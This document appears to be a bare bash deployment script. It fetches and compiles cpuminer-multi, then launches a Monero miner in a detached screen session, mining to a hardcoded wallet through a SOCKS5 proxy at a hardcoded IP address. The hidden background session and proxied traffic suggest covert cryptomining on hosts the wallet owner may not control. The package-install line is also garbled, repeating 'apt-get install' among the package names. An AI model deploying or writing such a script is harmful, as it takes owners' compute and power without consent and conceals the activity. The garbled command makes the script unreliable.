#!/bin/bash
sudo apt-get update
sudo apt-get install -y screen apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake
git clone https://github.com/hyc/cpuminer-multi && cd cpuminer-multi && ./autogen.sh
CFLAGS="-march=native" ./configure
make clean && make && screen -d -m ./minerd -a cryptonight -o stratum+tcp://mine.xmrpool.net:5555 -u 44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn.f3319bad0a4e5b2e7e7dd3d040ef87392831d2d4b5d81cc792b1e756fc94a48e+2000   -p 1  -x socks5://38.141.47.144:22089
